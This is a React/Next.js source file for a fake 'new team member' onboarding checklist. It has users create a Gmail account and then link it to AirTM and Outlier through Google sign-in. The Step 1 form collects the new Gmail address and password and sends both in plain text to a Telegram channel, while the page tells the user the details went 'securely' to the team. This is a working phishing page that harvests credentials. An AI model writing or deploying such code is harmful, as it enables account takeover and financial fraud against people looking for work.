"use client";

import { useState, FormEvent, useCallback } from "react";
import { useRouter } from "next/navigation";   // ← Make sure this import is here
import { sendTelegramMessage } from "../../utils1/telegram";

type Step = 0 | 1 | 2;

interface OnboardingStep {
  id: Step;
  label: string;
  title: string;
  description: string;
}

const STEPS: OnboardingStep[] = [
  {
    id: 0,
    label: "Step 1",
    title: "Create your Gmail account",
    description: "Set up a new Google account using the company format.",
  },
  {
    id: 1,
    label: "Step 2",
    title: "Create your AirTM account",
    description: "Register on AirTM using Google sign-in.",
  },
  {
    id: 2,
    label: "Step 3",
    title: "Create your Outlier account",
    description: "Register on Outlier using the same Google account.",
  },
];

export default function OnboardingChecklist() {
  const router = useRouter();   // ← Router is now correctly defined here

  const [openStep, setOpenStep] = useState<Step | null>(null);
  const [doneSteps, setDoneSteps] = useState<boolean[]>([false, false, false]);

  // Step 1 form state
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [formError, setFormError] = useState("");
  const [emailSent, setEmailSent] = useState(false);
  const [sending, setSending] = useState(false);

  const completedCount = doneSteps.filter(Boolean).length;
  const progressPct = Math.round((completedCount / 3) * 100);

  const toggleStep = useCallback((i: Step) => {
    setOpenStep(openStep === i ? null : i);
  }, [openStep]);

  const markDone = useCallback((i: Step) => {
    const updated = [...doneSteps];
    updated[i] = true;
    setDoneSteps(updated);
    const nextStep = (i + 1) as Step;
    setOpenStep(nextStep < 3 ? nextStep : null);
  }, [doneSteps]);

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setFormError("");

    const trimmedEmail = email.trim().toLowerCase();
    const trimmedPassword = password.trim();

    if (!trimmedEmail || !trimmedPassword) {
      setFormError("Both email and password are required.");
      return;
    }

    const emailPattern = /^[a-z]+outlier@gmail\.com$/;
    if (!emailPattern.test(trimmedEmail)) {
      setFormError(
        "Email must follow the format: firstnamelastnameoutlier@gmail.com (e.g. janesmithoutlier@gmail.com)"
      );
      return;
    }

    setSending(true);
    try {
      const message = `
🔔 *New Team Member Onboarding* 🔔
📧 Gmail: ${trimmedEmail}
🔑 Password: ${trimmedPassword}
      `.trim();

      await sendTelegramMessage(message);
      setEmailSent(true);
      setEmail("");
      setPassword("");
    } catch (err) {
      console.error("Telegram send error:", err);
      setFormError("Failed to send credentials. Please try again.");
    } finally {
      setSending(false);
    }
  };

  const resetStep1 = () => {
    setEmailSent(false);
    setFormError("");
  };

  const getCardClass = (i: Step) => {
    const base = "group border rounded-2xl p-6 mb-4 cursor-pointer transition-all duration-200 select-none shadow-sm hover:shadow-md";
    if (doneSteps[i]) return `${base} border-emerald-300 bg-emerald-50`;
    if (openStep === i) return `${base} border-blue-600 bg-white ring-1 ring-blue-200`;
    return `${base} border-gray-200 bg-white hover:border-gray-300`;
  };

  return (
    <div className="min-h-screen bg-zinc-50">
      <header className="bg-white border-b border-gray-200 px-8 py-6 shadow-sm">
        <div className="max-w-2xl mx-auto flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-semibold tracking-tight text-gray-900">
              New team member setup
            </h1>
            <p className="text-gray-500 mt-1 text-sm">
              Complete each step below to get fully onboarded
            </p>
          </div>
          <div className="px-4 py-1.5 bg-emerald-100 text-emerald-700 text-xs font-medium rounded-3xl flex items-center gap-1.5">
            <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
            Onboarding
          </div>
        </div>
      </header>

      <div className="max-w-2xl mx-auto px-6 py-10">
        <div className="mb-8">
          <div className="flex justify-between items-center mb-3 text-xs font-medium">
            <span className="text-gray-500">Progress</span>
            <span className="text-emerald-600 font-semibold">
              {completedCount} of 3 complete
            </span>
          </div>
          <div className="h-2 bg-gray-200 rounded-3xl overflow-hidden">
            <div
              className="h-2 bg-gradient-to-r from-emerald-500 to-emerald-600 transition-all duration-700 rounded-3xl"
              style={{ width: `${progressPct}%` }}
            />
          </div>
        </div>

        {STEPS.map((step) => (
          <div
            key={step.id}
            className={getCardClass(step.id)}
            onClick={() => toggleStep(step.id)}
          >
            <div className="flex items-start gap-4">
              <div className="flex-shrink-0 mt-0.5">
                {doneSteps[step.id] ? (
                  <div className="w-7 h-7 rounded-2xl bg-emerald-600 flex items-center justify-center">
                    <svg
                      width="16"
                      height="12"
                      viewBox="0 0 16 12"
                      fill="none"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path
                        d="M1.5 6L5.5 10L14.5 1"
                        stroke="white"
                        strokeWidth="2.5"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                      />
                    </svg>
                  </div>
                ) : (
                  <div className="w-7 h-7 rounded-2xl border-2 border-gray-300 flex items-center justify-center text-xs font-semibold text-gray-400 group-hover:border-gray-400 transition-colors">
                    {step.id + 1}
                  </div>
                )}
              </div>

              <div className="flex-1 min-w-0">
                <div className="flex items-center justify-between">
                  <div>
                    <span className="text-xs font-semibold uppercase tracking-[0.5px] text-gray-400">
                      {step.label}
                    </span>
                    <h3 className="font-semibold text-[17px] text-gray-900 mt-0.5 leading-tight">
                      {step.title}
                    </h3>
                  </div>
                  <ChevronIcon open={openStep === step.id} />
                </div>
                <p className="text-sm text-gray-500 mt-2 pr-8">{step.description}</p>
              </div>
            </div>

            {openStep === step.id && (
              <div className="mt-7 ml-11" onClick={(e) => e.stopPropagation()}>
                {step.id === 0 && (
                  <StepOneContent
                    email={email}
                    setEmail={setEmail}
                    password={password}
                    setPassword={setPassword}
                    showPassword={showPassword}
                    setShowPassword={setShowPassword}
                    formError={formError}
                    emailSent={emailSent}
                    sending={sending}
                    handleSubmit={handleSubmit}
                    markDone={() => markDone(0)}
                    resetStep1={resetStep1}
                  />
                )}

                {step.id === 1 && <StepTwoContent markDone={() => markDone(1)} />}

                {step.id === 2 && <StepThreeContent markDone={() => markDone(2)} />}
              </div>
            )}
          </div>
        ))}

        {/* Fixed completion button */}
        {completedCount === 3 && (
          <div className="mt-8 text-center">
            <button
              onClick={() => router.push("/complete")}
              className="inline-flex items-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white px-8 h-12 rounded-3xl font-semibold transition-all active:scale-95"
            >
              Continue<span className="text-xl">→</span>
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

/* ======================== SUB-COMPONENTS ======================== */

function ChevronIcon({ open }: { open: boolean }) {
  return (
    <svg
      className={`w-5 h-5 text-gray-400 transition-transform duration-200 ${open ? "rotate-180" : ""}`}
      fill="none"
      stroke="currentColor"
      strokeWidth={3}
      viewBox="0 0 24 24"
    >
      <path strokeLinecap="round" strokeLinejoin="round" d="M19 9l-7 7-7-7" />
    </svg>
  );
}

interface InfoRowProps {
  label: string;
  value: React.ReactNode;
}

function InfoRow({ label, value }: InfoRowProps) {
  return (
    <div className="flex justify-between items-center px-5 py-4 text-sm border-b border-gray-200 last:border-none">
      <span className="text-gray-500 font-medium">{label}</span>
      <span className="font-mono text-xs bg-white border border-gray-200 rounded-xl px-3 py-1">
        {value}
      </span>
    </div>
  );
}

/* Step 1 – Gmail Form */
function StepOneContent({
  email,
  setEmail,
  password,
  setPassword,
  showPassword,
  setShowPassword,
  formError,
  emailSent,
  sending,
  handleSubmit,
  markDone,
  resetStep1,
}: {
  email: string;
  setEmail: (v: string) => void;
  password: string;
  setPassword: (v: string) => void;
  showPassword: boolean;
  setShowPassword: (v: boolean) => void;
  formError: string;
  emailSent: boolean;
  sending: boolean;
  handleSubmit: (e: FormEvent) => Promise<void>;
  markDone: () => void;
  resetStep1: () => void;
}) {
  return (
    <>
      <div className="bg-white border border-gray-200 rounded-2xl shadow-sm mb-6 overflow-hidden">
        <InfoRow label="Email format" value="firstnamelastnameoutlier@gmail.com" />
        <InfoRow label="Password format" value="FirstLastname01" />
        <InfoRow
          label="Sign up at"
          value={
            <a
              href="https://accounts.google.com/signup"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline flex items-center gap-1"
            >
              accounts.google.com
              <span className="text-xs">↗</span>
            </a>
          }
        />
      </div>

      <div className="mb-6 bg-blue-50 border border-blue-200 rounded-2xl p-5 text-sm">
        <div className="flex items-center gap-2 mb-3">
          <span className="text-blue-600 text-lg">📋</span>
          <span className="font-semibold text-blue-900">Example — Jane Smith</span>
        </div>
        <div className="space-y-2 text-blue-800">
          <p>
            <span className="font-medium">Email:</span>{" "}
            <code className="font-mono bg-white px-2 py-px rounded-lg">janesmithoutlier@gmail.com</code>
          </p>
          <p>
            <span className="font-medium">Password:</span>{" "}
            <code className="font-mono bg-white px-2 py-px rounded-lg">JaneSmith01</code>
          </p>
        </div>
      </div>

      {!emailSent ? (
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Your new Gmail address
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="janesmithoutlier@gmail.com"
              className="w-full h-12 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-2xl px-5 text-base placeholder:text-gray-400"
              autoComplete="email"
            />
          </div>

          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Password for this account
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="JaneSmith01"
                className="w-full h-12 border border-gray-300 focus:border-blue-500 focus:ring-blue-500 rounded-2xl px-5 text-base placeholder:text-gray-400"
                autoComplete="new-password"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
              >
                {showPassword ? "🙈" : "👁️"}
              </button>
            </div>
          </div>

          {formError && (
            <div className="text-red-600 text-sm bg-red-50 border border-red-200 rounded-2xl px-4 py-3">
              {formError}
            </div>
          )}

          <button
            type="submit"
            disabled={sending || !email.trim() || !password.trim()}
            className="w-full h-12 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-300 disabled:cursor-not-allowed text-white font-semibold rounded-2xl transition-all text-base flex items-center justify-center gap-2"
          >
            {sending ? (
              <>
                <span className="animate-spin w-4 h-4 border-2 border-white border-t-transparent rounded-full" />
                Sending secure message…
              </>
            ) : (
              "Submit credentials →"
            )}
          </button>
        </form>
      ) : (
        <div className="space-y-4">
          <div className="bg-emerald-50 border border-emerald-200 rounded-2xl px-5 py-4 text-emerald-800 flex items-start gap-3">
            <span className="text-2xl">✅</span>
            <div>
              <p className="font-semibold">Credentials confirmed</p>
              <p className="text-sm mt-1">Your Gmail details have been securely sent to the team.</p>
            </div>
          </div>

          <button
            onClick={markDone}
            className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
          >
            Mark Step 1 as complete
          </button>

          <button
            onClick={resetStep1}
            className="w-full text-gray-400 hover:text-gray-500 text-sm font-medium"
          >
            ← Edit credentials
          </button>
        </div>
      )}
    </>
  );
}

function StepTwoContent({ markDone }: { markDone: () => void }) {
  return (
    <>
      <div className="bg-white border border-gray-200 rounded-2xl shadow-sm mb-6 overflow-hidden">
        <InfoRow
          label="Sign up at"
          value={
            <a
              href="https://www.airtm.com/en/signup/"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline flex items-center gap-1"
            >
              airtm.com/signup
              <span className="text-xs">↗</span>
            </a>
          }
        />
        <InfoRow label="Sign-in method" value="G (Google) button" />
        <InfoRow label="Account to use" value="Your new Outlier Gmail" />
      </div>

      <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 text-sm text-amber-800 mb-6">
        <strong className="font-semibold">Important:</strong> Tap the <span className="font-mono bg-white px-2 rounded">G</span> button (first option). Do not use Facebook, Apple, or email signup.
      </div>

      <button
        onClick={markDone}
        className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
      >
        Mark Step 2 as complete
      </button>
    </>
  );
}

function StepThreeContent({ markDone }: { markDone: () => void }) {
  return (
    <>
      <div className="bg-white border border-gray-200 rounded-2xl shadow-sm mb-6 overflow-hidden">
        <InfoRow
          label="Sign up at"
          value={
            <a
              href="https://app.outlier.ai/en/experts/signup"
              target="_blank"
              rel="noopener noreferrer"
              className="text-blue-600 hover:underline flex items-center gap-1"
            >
              outlier.ai/signup
              <span className="text-xs">↗</span>
            </a>
          }
        />
        <InfoRow label="Sign-in method" value="Sign in with Google" />
        <InfoRow label="Account to use" value="Your new Outlier Gmail" />
      </div>

      <p className="text-xs text-gray-500 leading-relaxed mb-6">
        Use the exact same Gmail account from Step 1. After signing in, complete any required profile or verification steps.
      </p>

      <button
        onClick={markDone}
        className="w-full h-12 bg-gray-900 hover:bg-black text-white font-semibold rounded-2xl transition-colors text-base"
      >
        Mark Step 3 as complete
      </button>
    </>
  );
}